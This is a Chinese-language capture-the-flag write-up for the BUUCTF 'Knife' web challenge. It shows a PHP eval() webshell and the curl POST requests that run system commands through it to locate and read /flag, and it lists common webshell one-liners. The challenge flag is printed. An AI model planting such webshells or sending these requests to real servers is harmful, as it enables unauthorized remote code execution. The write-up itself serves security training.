# 7- Knife (菜刀)

**题目名称:** 白给的shell

**题目描述:** 我家菜刀丢了，你能帮我找一下么

**题目地址:** http://c10e41e9-cfcb-4d2e-a6b5-5ea9d134fd28.node5.buuoj.cn:81/

---

## 信息收集

访问目标网站，得到如下页面：

- **标题:** 白给的shell
- **内容:** "我家菜刀丢了，你能帮我找一下么"
- **关键源码:** `eval($_POST["Syc"]);`

### 关键发现

页面源码中直接给出了一个 **一句话木马（webshell）**：

```php
eval($_POST["Syc"]);
```

- `eval()` 是 PHP 中的危险函数，可以将传入的字符串当作 PHP 代码执行
- `$_POST["Syc"]` 接收通过 POST 方法提交的 `Syc` 参数值
- 这意味着我们可以通过 POST 请求参数 `Syc` 来执行任意 PHP 代码

### 服务器信息

- **Server:** openresty (nginx + Lua)
- **PHP版本:** 5.5.9-1ubuntu4.29（旧版本）
- **后端:** PHP/5.5.9

---

## 利用过程

### 1. 使用 webshell 执行系统命令

通过 POST 参数 `Syc` 发送 `system('ls -la');` 列出当前目录：

```bash
curl -s "http://c10e41e9-cfcb-4d2e-a6b5-5ea9d134fd28.node5.buuoj.cn:81/" \
  -d "Syc=system('ls -la');"
```

**结果:** 当前目录只有 `index.php`

### 2. 搜索 flag 文件

```bash
curl -s "http://c10e41e9-cfcb-4d2e-a6b5-5ea9d134fd28.node5.buuoj.cn:81/" \
  -d "Syc=system('find / -name flag* 2>/dev/null');"
```

**结果:** 发现 `/flag` 文件

### 3. 读取 flag

```bash
curl -s "http://c10e41e9-cfcb-4d2e-a6b5-5ea9d134fd28.node5.buuoj.cn:81/" \
  -d "Syc=system('cat /flag');"
```

**Flag:** `flag{1d2f60bc-c6bb-4bfc-8fb3-9549e740dc09}`

---

## 知识点总结

### 1. 一句话木马（Webshell）

一句话木马是一种短小精悍的 web 后门脚本，通常由以下几个要素组成：

| 要素 | 作用 |
|------|------|
| `eval()` | 将字符串作为 PHP 代码执行 |
| `$_POST["Syc"]` | 接收用户通过 POST 方法提交的数据 |
| 木马上传/植入 | 攻击者通过文件上传、SQL注入、或已有漏洞植入 |

常见的 webshell 形式：

```php
<?php eval($_POST["cmd"]); ?>
<?php system($_POST["cmd"]); ?>
<?php @eval($_POST["pass"]); ?>
```

### 2. PHP `eval()` 函数

- `eval()` 把传入的字符串当作 PHP 代码执行
- 非常危险，在实际开发中应避免使用
- 本题中该函数被用于接收用户输入的任意代码

### 3. CTF 解题思路

对于提供了 webshell 的题目，一般流程：

1. **确认 webshell 存在** - 通过 POST 发送测试指令
2. **执行系统命令** - 利用 `system()`、`exec()`、`shell_exec()`、`passthru()` 等函数
3. **查找 flag 位置** - 使用 `find / -name flag*` 或 `grep -r flag /` 搜索
4. **读取 flag** - 使用 `cat` 命令读取

### 4. curl 常用参数

| 参数 | 作用 |
|------|------|
| `-s` | 静默模式，不显示进度信息 |
| `-d "key=val"` | 发送 POST 请求，传递数据 |
| `-X POST` | 指定请求方法为 POST（`-d` 会自动使用 POST） |

---

## 常见疑问：为什么 Syc 后面不能直接加命令，而是加上 `system()`？

这是一个很关键的理解点。**`eval()` 执行的是 PHP 代码，不是 shell 命令。**

`eval($_POST["Syc"]);` 等价于把 `$_POST["Syc"]` 的内容当作 PHP 代码来执行。

所以：

| 你发送的 Syc 值 | eval() 实际执行的代码 | 结果 |
|---|---|---|
| `ls -la` | `eval("ls -la");` | ❌ PHP 语法错误 — `ls -la` 不是合法的 PHP 语句 |
| `system('ls -la');` | `eval("system('ls -la');");` | ✅ 调用了 PHP 的 `system()` 函数来执行 shell 命令 |

`ls -la` 是 **shell 命令**，但 `eval()` 期望的是 **PHP 代码**。PHP 和 shell 是两门不同的语言，所以必须用 `system()`、`exec()`、`shell_exec()` 等 PHP 内置函数来桥接，告诉 PHP "把这串东西当成 shell 命令去跑"。

简单说就是：**`eval()` 听不懂 shell，只听得懂 PHP。`system()` 就是那个翻译官。**

---

## 注意事项

1. 实际渗透测试中，发现 webshell 需要进一步排查系统是否被植入其他后门
2. 本题是 CTF 竞赛题目，在授权的环境中进行学习
3. `eval()` 在真实项目中应被严格禁止使用
